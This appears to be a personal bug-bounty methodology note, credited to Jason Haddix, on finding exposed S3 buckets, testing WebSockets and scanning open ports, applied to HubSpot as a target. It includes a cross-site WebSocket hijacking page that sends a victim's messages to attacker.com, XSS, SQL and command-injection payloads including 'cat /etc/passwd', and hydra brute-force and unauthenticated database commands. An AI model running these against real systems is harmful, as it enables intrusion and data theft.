# S3 Buckets, WebSockets, and Open Ports Methodology
## Based on Jason Haddix's Bug Hunter's Methodology

**Source**: Jason Haddix (DEFCON, NahamCon, Bug Bounty methodology)
**Date Created**: 2025-10-23
**Context**: Advanced reconnaissance and exploitation techniques

**Jason Haddix's Philosophy**: "The cloud is the new perimeter. S3 buckets, WebSockets, and non-HTTP services are often forgotten during security reviews - that's where you find the gold."

---

## Table of Contents
1. [S3 Buckets & Cloud Storage](#s3-buckets--cloud-storage)
2. [WebSockets Vulnerabilities](#websockets-vulnerabilities)
3. [Open Ports & Service Discovery](#open-ports--service-discovery)
4. [HubSpot-Specific Application](#hubspot-specific-application)

---

# S3 Buckets & Cloud Storage

## What Are S3 Buckets?

**S3 (Simple Storage Service)**: Amazon's cloud storage service where companies store:
- Static website files (images, CSS, JS)
- Backups and archives
- User uploads
- Configuration files
- Database dumps
- Application logs
- Internal documents

**Similar Services**:
- Azure Blob Storage (Microsoft)
- Google Cloud Storage (GCS)
- DigitalOcean Spaces
- Wasabi

**The Problem**: Buckets are often misconfigured with public access when they should be private.

---

## Why S3 Buckets Matter for Bug Bounty

### Common Misconfigurations

**1. Public Read Access**
```
Anyone can list and download files:
- Customer PII
- Database backups
- API keys in config files
- Source code
- Internal documents
- User uploads
```

**2. Public Write Access** (Even Worse!)
```
Attacker can upload files:
- Malware
- Phishing pages
- Defacement content
- XSS payloads that execute when viewed
```

**3. Subdomain Takeover via S3**
```
Company has: static.target.com → CNAME → old-bucket.s3.amazonaws.com
But: old-bucket doesn't exist anymore
Attacker: Creates bucket named "old-bucket"
Result: Attacker controls static.target.com
```

### Real-World Impact Examples

**Jason Haddix's Findings**:
- Found S3 bucket with 40GB of customer PII → Critical severity
- Discovered backup bucket with complete database dump → Critical
- Found bucket with AWS credentials in config.json → Account takeover
- Uploaded XSS payload to public-writable bucket → Stored XSS

---

## Finding S3 Buckets

### Method 1: From Subdomain Enumeration

**During httpx probing, look for S3 URLs**:
```bash
# From your enumeration results
cat ~/hubspot_recon/verified/web_services.txt | grep -i "s3\|amazonaws"

# Common patterns:
assets.target.com → CNAME → target-assets.s3.amazonaws.com
uploads.target.com → CNAME → target-uploads.s3.amazonaws.com
static.target.com → CNAME → target-static.s3.amazonaws.com
cdn.target.com → CNAME → target-cdn.s3.amazonaws.com
```

### Method 2: From JavaScript Files

**S3 URLs often hardcoded in JavaScript**:
```bash
# Extract all URLs from JS files
cat javascript_files.txt | while read url; do
  curl -s "$url" | grep -Eo "https?://[a-zA-Z0-9.-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com[/a-zA-Z0-9._-]*"
done | sort -u > s3_buckets_from_js.txt

# Also look for:
# - s3.amazonaws.com
# - s3-region.amazonaws.com (e.g., s3-us-west-2.amazonaws.com)
# - s3.region.amazonaws.com
```

### Method 3: Bucket Name Permutation

**Common naming patterns**:
```bash
# Company name variations
hubspot
hubspot-prod
hubspot-production
hubspot-staging
hubspot-dev
hubspot-test
hubspot-backups
hubspot-uploads
hubspot-assets
hubspot-static
hubspot-files

# With regions
hubspot-us-east-1
hubspot-eu-west-1

# With environments
hubspot-prod-assets
hubspot-staging-uploads
hubspot-dev-backups
```

**Test each variation**:
```bash
# Using AWS CLI (if installed)
aws s3 ls s3://hubspot-assets --no-sign-request

# Using curl
curl -I https://hubspot-assets.s3.amazonaws.com

# Using bucket discovery tool
python3 bucket_finder.py --bucket-names buckets.txt
```

### Method 4: Google Dorking

```
site:s3.amazonaws.com "hubspot"
site:s3.amazonaws.com inurl:hubspot
site:amazonaws.com "hubspot"

# Find exposed files
site:s3.amazonaws.com ext:sql "hubspot"
site:s3.amazonaws.com ext:zip "hubspot"
site:s3.amazonaws.com ext:backup "hubspot"
site:s3.amazonaws.com ext:env "hubspot"
```

### Method 5: Certificate Transparency Logs

```bash
# S3 buckets sometimes get SSL certs
curl -s "https://crt.sh/?q=%25.s3.amazonaws.com&output=json" | \
  jq -r '.[].name_value' | grep -i "hubspot" | sort -u
```

---

## Testing S3 Buckets

### Check 1: Does Bucket Exist?

```bash
# Using curl
curl -I https://BUCKET_NAME.s3.amazonaws.com

# 200 OK → Bucket exists and is public
# 403 Forbidden → Bucket exists but is private
# 404 Not Found → Bucket doesn't exist
```

### Check 2: Can You List Contents?

```bash
# Try to list files
curl https://BUCKET_NAME.s3.amazonaws.com

# If successful, you'll see XML listing:
<ListBucketResult>
  <Contents>
    <Key>secret-file.txt</Key>
    <Key>config.json</Key>
    <Key>database-backup.sql</Key>
  </Contents>
</ListBucketResult>

# Download interesting files
curl https://BUCKET_NAME.s3.amazonaws.com/config.json
```

### Check 3: Can You Upload Files?

```bash
# Try to upload test file
echo "test" > test.txt
aws s3 cp test.txt s3://BUCKET_NAME/test.txt --no-sign-request

# If successful → PUBLIC WRITE ACCESS (Critical!)
```

### Check 4: Look for Sensitive Files

**Common sensitive filenames**:
```
config.json
.env
database.sql
backup.zip
users.csv
credentials.json
aws.json
api-keys.txt
passwords.txt
.git/config
.ssh/id_rsa
```

---

## Automated S3 Bucket Tools

### Bucket Discovery Tools

**1. S3Scanner**
```bash
# Install
pip3 install s3scanner

# Scan for buckets
s3scanner --bucket-file bucket_names.txt
```

**2. Bucket Stream**
```bash
# Real-time S3 bucket monitoring
git clone https://github.com/eth0izzle/bucket-stream
cd bucket-stream
python3 bucket-stream.py --keywords hubspot
```

**3. CloudBrute**
```bash
# Cloud storage brute forcer
git clone https://github.com/0xsha/CloudBrute
cd CloudBrute
go run main.go -d hubspot -k hubspot -w -o results.txt
```

**4. Nuclei Templates**
```bash
# You already have nuclei installed!
nuclei -u https://hubspot-assets.s3.amazonaws.com -t ~/nuclei-templates/misconfiguration/
```

---

## S3 Bucket Takeover

### The Attack

**Scenario**:
```
1. Company uses: static.hubspot.com
2. DNS CNAME: static.hubspot.com → old-assets.s3.amazonaws.com
3. Company deleted "old-assets" bucket
4. DNS still points to it
5. Attacker creates bucket named "old-assets"
6. Attacker now controls static.hubspot.com
```

### Finding Takeover Opportunities

```bash
# From your subdomain CNAME check
cat ~/hubspot_recon/verified/subdomains_cnames.txt | grep -i "s3\|amazonaws"

# Check if bucket exists
while read line; do
  subdomain=$(echo $line | cut -d' ' -f1)
  cname=$(echo $line | cut -d' ' -f2)

  if [[ $cname == *"s3"* ]]; then
    bucket=$(echo $cname | cut -d'.' -f1)
    echo "Testing: $subdomain -> $bucket"

    status=$(curl -sI https://$bucket.s3.amazonaws.com | head -1)
    echo "$subdomain: $status"

    if [[ $status == *"404"* ]]; then
      echo "⚠️ POTENTIAL TAKEOVER: $subdomain"
    fi
  fi
done < subdomains_cnames.txt
```

### Automated Takeover Detection

```bash
# Using subjack
subjack -w subdomains.txt -t 100 -timeout 30 -o takeovers.txt

# Using nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/
```

---

## Azure & GCS Equivalents

### Azure Blob Storage

**URL Patterns**:
```
https://ACCOUNT.blob.core.windows.net/CONTAINER
https://hubspot.blob.core.windows.net/assets
https://hubspotprod.blob.core.windows.net/uploads
```

**Testing**:
```bash
# List blobs
curl https://hubspot.blob.core.windows.net/assets?restype=container&comp=list

# Check for public access
curl https://hubspot.blob.core.windows.net/assets/file.txt
```

### Google Cloud Storage

**URL Patterns**:
```
https://storage.googleapis.com/BUCKET_NAME
https://BUCKET_NAME.storage.googleapis.com
```

**Testing**:
```bash
# List objects
curl https://storage.googleapis.com/hubspot-assets

# Using gsutil
gsutil ls gs://hubspot-assets
```

---

# WebSockets Vulnerabilities

## What Are WebSockets?

**WebSocket**: Protocol for real-time bidirectional communication between browser and server.

**Used For**:
- Chat applications
- Live notifications
- Real-time collaboration (Google Docs style)
- Live dashboards
- Gaming
- Trading platforms
- Video conferencing

**URL Format**:
```
ws://target.com/socket    (unencrypted)
wss://target.com/socket   (encrypted)
```

---

## Why WebSockets Matter for Bug Bounty

### Common Vulnerabilities

**1. Lack of Authentication**
```
WebSocket accepts connections without checking who you are
→ Access to private messages, data, events
```

**2. Missing Authorization Checks**
```
Connected but can subscribe to other users' channels
→ Read messages meant for other users
→ Receive notifications for other accounts
```

**3. Cross-Site WebSocket Hijacking (CSWSH)**
```
Similar to CSRF but for WebSockets
→ Malicious site connects to WebSocket as victim
→ Can send/receive messages as victim
```

**4. Message Injection**
```
WebSocket doesn't validate message format
→ Inject malicious payloads
→ XSS via WebSocket messages
→ SQL injection via WebSocket params
```

**5. Information Disclosure**
```
WebSocket leaks sensitive data in messages
→ API keys
→ Session tokens
→ User PII
→ Internal system info
```

---

## Finding WebSockets

### Method 1: JavaScript Analysis

```bash
# Search for WebSocket initialization
grep -r "new WebSocket\|socket\.io\|sockjs" *.js

# Common patterns:
var ws = new WebSocket('wss://api.hubspot.com/realtime');
const socket = io('https://notifications.hubspot.com');
```

### Method 2: Browser DevTools

```
1. Open target website
2. DevTools → Network tab
3. Filter: WS (WebSockets)
4. Look for:
   - Connection URLs
   - Message formats
   - Authentication mechanisms
```

### Method 3: Subdomain Probing

```bash
# WebSocket-specific subdomains
grep -iE "(ws|socket|realtime|live|stream|chat|notify)" \
  ~/hubspot_recon/verified/live_subdomains.txt > websocket_candidates.txt

# Common patterns:
ws.target.com
websocket.target.com
realtime.target.com
live.target.com
socket.target.com
chat.target.com
notifications.target.com
```

### Method 4: HTTP Upgrade Headers

```bash
# Check for WebSocket upgrade capability
curl -I https://api.hubspot.com/socket \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade"

# Response with:
# HTTP/1.1 101 Switching Protocols
# → WebSocket endpoint confirmed
```

---

## Testing WebSocket Security

### Test 1: Unauthenticated Connection

```javascript
// Try connecting without authentication
const ws = new WebSocket('wss://api.hubspot.com/realtime');

ws.onopen = function() {
  console.log('Connected without auth!');
  ws.send('{"action":"subscribe","channel":"admin"}');
};

ws.onmessage = function(event) {
  console.log('Received:', event.data);
  // If you receive data → vulnerability
};
```

### Test 2: Cross-Site WebSocket Hijacking

**Create malicious HTML**:
```html
<html>
<body>
<script>
// Victim's browser connects to WebSocket with their cookies
var ws = new WebSocket('wss://target.com/socket');

ws.onopen = function() {
  // Subscribe to victim's channel
  ws.send('{"action":"getMessages"}');
};

ws.onmessage = function(event) {
  // Exfiltrate to attacker
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: event.data
  });
};
</script>
</body>
</html>
```

**Test**:
```
1. Host malicious page
2. Trick victim into visiting
3. If messages received → CSWSH vulnerability
```

### Test 3: Authorization Bypass

```javascript
// Connect as low-privilege user
const ws = new WebSocket('wss://target.com/socket?token=LOW_PRIV_TOKEN');

ws.onopen = function() {
  // Try subscribing to admin channel
  ws.send('{"action":"subscribe","channel":"admin"}');

  // Try requesting other user's data
  ws.send('{"action":"getUser","userId":"admin_user_id"}');
};

// If successful → Authorization bypass
```

### Test 4: Message Injection

```javascript
const ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
  // Try XSS injection
  ws.send('{"message":"<script>alert(1)</script>"}');

  // Try SQL injection
  ws.send('{"userId":"1\' OR 1=1--"}');

  // Try command injection
  ws.send('{"filename":"test.txt; cat /etc/passwd"}');
};
```

### Test 5: Origin Validation

```javascript
// Connect from unauthorized origin
const ws = new WebSocket('wss://target.com/socket');

// Check if server validates Origin header
// If no validation → potential CSWSH
```

---

## WebSocket Testing Tools

### wscat (Command Line)

```bash
# Install
npm install -g wscat

# Connect to WebSocket
wscat -c wss://api.hubspot.com/realtime

# Send messages interactively
> {"action":"subscribe","channel":"test"}

# With custom headers
wscat -c wss://api.hubspot.com/socket \
  -H "Authorization: Bearer TOKEN" \
  -H "Origin: https://attacker.com"
```

### Burp Suite WebSocket Support

```
1. Proxy traffic through Burp
2. WebSockets History tab
3. Intercept and modify messages
4. Replay attacks
5. Test different payloads
```

### ws-harness (Automated Testing)

```bash
# Install
npm install -g ws-harness

# Test WebSocket endpoint
ws-harness --url wss://target.com/socket \
  --origin https://evil.com \
  --test-injection
```

---

## WebSocket Attack Scenarios

### Scenario 1: Live Notification Hijacking

```
Target: Real-time notification system
Finding: No origin validation on WebSocket

Attack:
1. Victim logged into hubspot.com
2. Visit attacker page
3. Attacker page connects to wss://notifications.hubspot.com
4. Receives victim's notifications (may contain sensitive data)

Impact: Information disclosure, privacy violation
```

### Scenario 2: Chat Message Injection

```
Target: Internal chat system
Finding: No input validation on WebSocket messages

Attack:
1. Connect to wss://chat.hubspot.com
2. Send: {"message":"<img src=x onerror=alert(document.cookie)>"}
3. When other users view chat → XSS executes

Impact: Stored XSS, session hijacking
```

### Scenario 3: Admin Channel Subscription

```
Target: Admin dashboard with live updates
Finding: No authorization check on channel subscription

Attack:
1. Low-priv user connects to WebSocket
2. Send: {"action":"subscribe","channel":"admin_dashboard"}
3. Receive admin-only events and data

Impact: Privilege escalation, information disclosure
```

---

# Open Ports & Service Discovery

## Why Port Scanning Matters

**Jason Haddix**: "Most researchers only test port 80 and 443. The real vulnerabilities are on ports nobody's checking."

### Common Vulnerable Services on Non-Standard Ports

**Database Ports** (Often Exposed):
```
3306  - MySQL
5432  - PostgreSQL
27017 - MongoDB
6379  - Redis
9200  - Elasticsearch
```

**Admin/Management Ports**:
```
8080  - HTTP alternate (often admin panels)
8443  - HTTPS alternate
8888  - HTTP alternate
9090  - Admin interfaces
```

**Development/Debug Ports**:
```
3000  - Node.js dev server
4000  - Common dev port
5000  - Flask default
8000  - Python HTTP server
```

**Infrastructure Ports**:
```
22    - SSH
21    - FTP
2222  - SSH alternate
445   - SMB
3389  - RDP
```

---

## Port Scanning Methodology

### Phase 1: Quick Top Ports Scan

```bash
# Using nmap (top 1000 ports)
nmap -iL ~/hubspot_recon/verified/live_subdomains.txt \
  --top-ports 1000 --open -oA nmap_top1000

# Using naabu (fast port scanner)
cat ~/hubspot_recon/verified/live_subdomains.txt | \
  naabu -top-ports 1000 -o open_ports.txt

# Expected time: 5-15 minutes
```

### Phase 2: Full Port Scan (High Priority Targets Only)

```bash
# Scan all 65535 ports on priority targets
nmap -p- -iL priority_targets.txt --open -oA nmap_full_scan

# Or with naabu (faster)
cat priority_targets.txt | naabu -p - -o all_ports.txt

# Expected time: 30-60 minutes per target
```

### Phase 3: Service Detection

```bash
# Identify what's running on open ports
nmap -sV -p $(cat open_ports.txt | cut -d: -f2 | tr '\n' ',') \
  -iL targets.txt -oA service_detection

# Get versions, OS detection
nmap -sV -O -p 22,80,443,3306,8080 target.com
```

---

## Testing Common Services

### MySQL/PostgreSQL (Ports 3306/5432)

```bash
# Check if database is exposed
nmap -p 3306 --script mysql-info target.com
nmap -p 5432 --script pgsql-info target.com

# Try anonymous login
mysql -h target.com -u root
psql -h target.com -U postgres

# If successful → CRITICAL vulnerability
```

### MongoDB (Port 27017)

```bash
# Check if MongoDB is exposed
nmap -p 27017 --script mongodb-info target.com

# Try connecting
mongo target.com:27017

# List databases
show dbs

# If no auth required → CRITICAL
```

### Redis (Port 6379)

```bash
# Check if Redis exposed
nmap -p 6379 --script redis-info target.com

# Connect
redis-cli -h target.com

# Test auth
AUTH password

# If no auth or weak auth → HIGH severity
```

### Elasticsearch (Port 9200)

```bash
# Check if Elasticsearch exposed
curl http://target.com:9200

# List indices
curl http://target.com:9200/_cat/indices

# Query data
curl http://target.com:9200/users/_search?pretty

# If publicly accessible → CRITICAL
```

### SSH (Port 22)

```bash
# Check SSH version
nmap -p 22 --script ssh-hostkey target.com

# Look for weak algorithms
nmap -p 22 --script ssh2-enum-algos target.com

# Test weak creds
hydra -L users.txt -P passwords.txt ssh://target.com
```

### FTP (Port 21)

```bash
# Check for anonymous FTP
nmap -p 21 --script ftp-anon target.com

# Connect
ftp target.com
# Username: anonymous
# Password: anonymous@

# If anonymous access → Medium/High severity
```

---

## Port Scanning Tools

### nmap (Classic)

```bash
# Quick scan
nmap -F target.com

# Full scan
nmap -p- target.com

# Service version detection
nmap -sV -p 22,80,443 target.com

# With scripts
nmap --script vuln -p 80,443 target.com
```

### naabu (Fast Modern Scanner)

```bash
# Already installed!
naabu -host target.com -top-ports 1000

# Scan from file
cat subdomains.txt | naabu -p 80,443,8080,8443

# All ports
naabu -host target.com -p -
```

### masscan (Fastest)

```bash
# Install
brew install masscan

# Scan entire range
masscan -p1-65535 --rate 10000 target.com

# Specific ports, many targets
masscan -p80,443,8080 -iL targets.txt --rate 10000
```

---

## Non-HTTP Service Vulnerabilities

### Docker API (Port 2375/2376)

```bash
# Check if Docker API exposed
curl http://target.com:2375/version

# If accessible:
# List containers
curl http://target.com:2375/containers/json

# Create container and get shell → RCE
```

### Memcached (Port 11211)

```bash
# Check if memcached exposed
echo "stats" | nc target.com 11211

# Can be used for:
# - Information disclosure
# - DDoS amplification
```

### Kubernetes API (Port 6443)

```bash
# Check if K8s API exposed
curl -k https://target.com:6443

# If no auth:
kubectl --server=https://target.com:6443 get pods --all-namespaces

# → Cluster takeover
```

---

# HubSpot-Specific Application

## S3 Buckets for HubSpot

### Expected Bucket Names

```bash
# Create wordlist
echo "hubspot
hubspot-prod
hubspot-production
hubspot-staging
hubspot-dev
hubspot-assets
hubspot-static
hubspot-uploads
hubspot-backups
hubspot-files
hubspot-data
hubspot-logs
hubspot-marketing
hubspot-crm
hubspot-sales
hubspot-service
hubspot-cms
hubspot-app" > hubspot_buckets.txt

# Test each
while read bucket; do
  echo "Testing: $bucket"
  curl -sI https://$bucket.s3.amazonaws.com | head -1
done < hubspot_buckets.txt
```

### From Your Source Code

```bash
# Search your extracted JS for S3 URLs
cd /Users/itza/Documents/vault_self/bcck_vault/LEARNING/targets/hubspot/source-intel/extracted

grep -rh "s3\.amazonaws\.com\|blob\.core\.windows\.net\|storage\.googleapis\.com" . | \
  grep -Eo "https?://[a-zA-Z0-9.-]+\.(s3[a-zA-Z0-9.-]*\.amazonaws\.com|blob\.core\.windows\.net|storage\.googleapis\.com)" | \
  sort -u > ~/hubspot_recon/s3_buckets_from_source.txt
```

---

## WebSockets for HubSpot

### Finding WebSockets

```bash
# Search source code for WebSocket usage
cd /Users/itza/Documents/vault_self/bcck_vault/LEARNING/targets/hubspot/source-intel/extracted

grep -rh "WebSocket\|socket\.io\|sockjs\|ws://\|wss://" . | \
  grep -Eo "wss?://[a-zA-Z0-9.-/]+" | \
  sort -u > ~/hubspot_recon/websockets_from_source.txt

# Common HubSpot WebSocket patterns
echo "wss://api.hubspot.com/socket
wss://realtime.hubspot.com
wss://notifications.hubspot.com
wss://chat.hubspot.com
wss://live.hubspot.com" >> ~/hubspot_recon/websocket_candidates.txt
```

### Testing HubSpot WebSockets

```bash
# If found, test with wscat
wscat -c wss://api.hubspot.com/realtime

# Try without auth
# Try different origins
# Try message injection
```

---

## Open Ports for HubSpot

### Port Scan Priority Targets

```bash
# Scan your tier 1 priority subdomains
naabu -list ~/hubspot_recon/priority/tier1_priority.txt \
  -top-ports 1000 \
  -o ~/hubspot_recon/hubspot_open_ports.txt

# Focus on:
# - dev/test/staging subdomains (more likely to have exposed services)
# - admin subdomains
# - internal subdomains
```

### Look For

```
Port 3000-5000: Development servers
Port 8080-8888: Admin panels, alternate HTTP
Port 3306: MySQL (database exposure)
Port 27017: MongoDB
Port 6379: Redis
Port 9200: Elasticsearch
```

---

## Practical Workflow

### Today's Additions (While Subfinder Runs)

```bash
cd ~/hubspot_recon

# 1. Create S3 bucket wordlist
mkdir -p cloud
cat > cloud/bucket_names.txt << 'EOF'
hubspot
hubspot-prod
hubspot-production
hubspot-staging
hubspot-dev
hubspot-assets
hubspot-static
hubspot-uploads
EOF

# 2. Test bucket existence
while read bucket; do
  printf "Testing %s: " "$bucket"
  curl -sI "https://$bucket.s3.amazonaws.com" | head -1
done < cloud/bucket_names.txt > cloud/bucket_results.txt

# 3. Search for WebSockets in source
# (Will do this after we have subdomain results)

# 4. Plan port scanning
# (Will do on priority targets after enumeration)
```

---

## Key Takeaways

**S3 Buckets**:
1. Found via subdomain CNAMEs, JS files, permutation
2. Test for public read/write
3. Look for sensitive files
4. Check for subdomain takeover
5. Impact: Often CRITICAL (data exposure)

**WebSockets**:
1. Found in JS, DevTools, subdomain patterns
2. Test auth, authorization, origin validation
3. Try message injection
4. Impact: CSWSH, XSS, information disclosure

**Open Ports**:
1. Scan beyond 80/443
2. Focus on databases, admin panels, dev servers
3. Test default/weak credentials
4. Impact: Often CRITICAL (database exposure, RCE)

**Jason Haddix's Wisdom**:
> "The vulnerabilities aren't in the polished, public-facing web app. They're in the forgotten S3 bucket from 2018, the WebSocket that never got auth, and the MongoDB that someone exposed for 'testing' and forgot to close."

---

**These are force multipliers. When combined with subdomain enumeration, they exponentially increase your attack surface.**
